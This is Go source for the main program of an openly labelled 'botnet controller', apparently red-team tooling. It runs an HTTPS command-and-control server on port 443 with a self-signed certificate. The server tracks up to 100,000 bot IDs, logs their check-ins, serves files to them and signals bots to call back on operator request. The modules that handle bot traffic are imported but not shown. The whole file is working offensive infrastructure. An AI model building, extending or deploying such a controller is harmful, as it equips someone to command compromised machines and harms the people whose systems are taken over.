// Program loweffortbotnetcontroller - A botnet controller written with very low effort
package main

/*
 * loweffortbotnetcontroller.go
 * A botnet controller written with very low effort
 * By J. Stuart McMurray
 * Created 20240806
 * Last Modified 20240807
 */

import (
	"context"
	"flag"
	"fmt"
	"io"
	"log"
	"log/slog"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"
	"time"

	"github.com/magisterquis/curlrevshell/lib/sstls"
	"github.com/magisterquis/loweffortbotnetcontroller/internal/callbackfiles"
	"github.com/magisterquis/loweffortbotnetcontroller/internal/hsrv"
	"github.com/magisterquis/loweffortbotnetcontroller/internal/idmanager"
	"golang.org/x/sync/errgroup"
)

/* (Intended) compile-time config. */
var (
	// DefaultListenAddress is the address on which we try to listen if
	// -listen isn't given.
	DefaultListenAddress = "0.0.0.0:443"
	// DefaultCallbackString is the string we send back when we want an ID
	// to call us back.
	DefaultCallbackString = "loweffortbotnetcontroller_callback"
	// DefaultDir can be set as a default for -dir.
	DefaultDir string
)

/* Other compile-time config, but less likely. */
var (
	DefaultBaseDir      = "loweffortbotnetcontroller.d"
	LogFile             = "log.json"
	IDManagerFile       = "id.json"
	CheckInDir          = "checkins"
	StaticFilesDir      = "files"
	CallbackRequestsDir = "callbackrequests"
)

func main() { os.Exit(rmain()) }

func rmain() int {
	/* Command-line flags. */
	var (
		lAddr = flag.String(
			"listen",
			DefaultListenAddress,
			"HTTPS listen `address`",
		)
		dir = flag.String(
			"dir",
			defaultDir(),
			"LowEffortBotnetController's directory",
		)
		callbackString = flag.String(
			"callback-string",
			DefaultCallbackString,
			"String sent in reply to a checkin to "+
				"request a callback",
		)
		debugOn = flag.Bool(
			"debug",
			false,
			"Enable debug logging",
		)
		maxIDs = flag.Uint(
			"max-ids",
			100000,
			"Maximum `number` of IDs to track",
		)
		interval = flag.Duration(
			"update-every",
			time.Second,
			"ID Tracking and Callback Request update `interval`",
		)
		certFile = flag.String(
			"tls-certificate-cache",
			sstls.DefaultCertFile(),
			"Optional `file` in which to cache generated "+
				"TLS certificate",
		)
		maxCallbackBody = flag.Int64(
			"max-callback",
			1024*1024,
			"Maximum callback body to keep",
		)
		printFingerprint = flag.Bool(
			"print-fingerprint",
			false,
			"Print the TLS fingerprint and exit",
		)
		printCallbackString = flag.Bool(
			"print-callback-string",
			false,
			"Print the callback string and exit",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %s [options]

A botnet controller written with very low effort.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* If we're just printing something, life's easy. */
	if *printFingerprint {
		fp, err := hsrv.Fingerprint(*certFile)
		if nil != err {
			log.Fatalf("Error getting fingerprint: %s", err)
		}
		fmt.Printf("%s\n", fp)
		return 0
	} else if *printCallbackString {
		fmt.Printf("%s\n", *callbackString)
		return 0
	}

	/* Make our directory. */
	if err := os.MkdirAll(*dir, 0770); nil != err {
		log.Fatalf("Error making directory %s: %s", *dir, err)
	}

	/* Make logger. */
	lfn := filepath.Join(*dir, LogFile)
	lf, err := os.OpenFile(
		lfn,
		os.O_CREATE|os.O_APPEND|os.O_WRONLY,
		0660,
	)
	if nil != err {
		log.Fatalf("Error opening logfile %s: %s", lfn, err)
	}
	defer lf.Close()
	var lv slog.LevelVar
	if *debugOn {
		lv.Set(slog.LevelDebug)
	}
	sl := slog.New(slog.NewJSONHandler(
		io.MultiWriter(lf, os.Stdout),
		&slog.HandlerOptions{
			AddSource: *debugOn,
			Level:     &lv,
		},
	))
	sl.Debug("Logging starting", "filename", lfn)

	/* We'll do a bunch of things together, and die together. */
	ctx, cancel := context.WithCancelCause(context.Background())
	defer cancel(fmt.Errorf("program terminated"))
	eg, ectx := errgroup.WithContext(ctx)

	/* Set up ID manager and have it update every so often. */
	idf := filepath.Join(*dir, IDManagerFile)
	idm, err := idmanager.New(idf, *maxIDs)
	if nil != err {
		sl.Error("Failed to initialize ID tracker", "error", err)
		return 1
	}
	eg.Go(func() error {
		ticker := time.NewTicker(*interval)
		defer ticker.Stop()
		for {
			select {
			case <-ectx.Done():
				return nil
			case <-ticker.C:
				if err := idm.Write(); nil != err {
					return fmt.Errorf(
						"writing IDs: %w",
						err,
					)
				}
			}
		}
	})
	sl.Debug("ID file initialized", "path", idf)

	/* Watch for callback requests. */
	crd := filepath.Join(*dir, CallbackRequestsDir)
	if err := os.MkdirAll(crd, 0770); nil != err {
		sl.Error("Error making callback requests directory",
			"directory", crd,
			"error", err,
		)
		return 5
	}
	sl.Debug("Callback requests directory", "directory", crd)
	eg.Go(func() error {
		ticker := time.NewTicker(*interval)
		defer ticker.Stop()
		for {
			select {
			case <-ectx.Done():
				return nil
			case <-ticker.C:
				if err := callbackfiles.GetCallbackRequests(
					sl,
					idm,
					crd,
				); nil != err {
					sl.Error(
						"Error getting callback "+
							"requests",
						"error", err,
					)
				}
			}
		}
	})

	/* Start HTTP server going. */
	sfd := filepath.Join(*dir, StaticFilesDir)
	if err := os.MkdirAll(sfd, 0770); nil != err {
		sl.Error(
			"Error making static files directory",
			"directory", sfd,
			"error", err,
		)
		return 3
	}
	cid := filepath.Join(*dir, CheckInDir)
	if err := os.MkdirAll(cid, 0770); nil != err {
		sl.Error(
			"Error making check-in files directory",
			"directory", cid,
			"error", err,
		)
		return 4
	}
	sl.Debug("Check-in files directory", "directory", cid)
	eg.Go(func() error {
		return hsrv.Serve(
			ectx,
			sl,
			*lAddr,
			*certFile,
			sfd,
			idm,
			cid,
			*callbackString,
			*maxCallbackBody,
		)
	})

	/* Watch for Ctrl+C and friends. */
	sigCh := make(chan os.Signal, 2)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		/* On first Ctrl+C shut everything down. */
		sig := <-sigCh
		sl.Info("Caught signal, shutting down", "signal", sig)
		cancel(fmt.Errorf("caught signal: %s", sig))
		/* On second Ctrl+C, exit unhappily. */
		sig = <-sigCh
		sl.Error("Caught second signal, exiting", "signal", sig)
		os.Exit(6)
	}()

	/* Wait for something to go wrong. */
	ret := 0
	if err := eg.Wait(); nil != err {
		sl.Error("Fatal error", "error", err)
		ret = 7
	} else {
		sl.Info("Server shut down")
	}

	/* Final attempt to flush the ID manager's file. */
	if err := idm.Write(); nil != err {
		sl.Error("Error during final ID file write", "error", err)
		ret = 8
	}

	return ret
}

// defaultDir returns DefaultDir if set, or DefaultBaseDir in the user's home
// directory if we can get a home directory, or just DefaultBaseDir.
func defaultDir() string {
	/* If we have a baked-in default directory, return that. */
	if "" != DefaultDir {
		return DefaultDir
	}
	hd, err := os.UserHomeDir()
	if nil != err { /* Low effort... */
		hd = ""
	}

	return filepath.Join(hd, DefaultBaseDir)
}
